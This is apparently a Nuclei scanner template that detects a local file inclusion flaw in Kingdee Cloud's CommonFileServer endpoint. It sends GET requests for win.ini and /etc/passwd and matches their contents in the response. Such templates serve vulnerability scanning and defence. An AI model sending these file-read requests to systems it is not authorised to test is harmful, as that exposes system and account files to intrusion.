http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  - part: body
    regex:
    - root:.*:0:0
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/CommonFileServer/c:/Windows/win.ini'
  - '{{BaseURL}}/CommonFileServer/etc/passwd'
id: kingdee-cloud-CommonFileserver-fileread
info:
  author: Co5mos
  name: Kingdee Cloud - Local File Inclusion
  severity: high
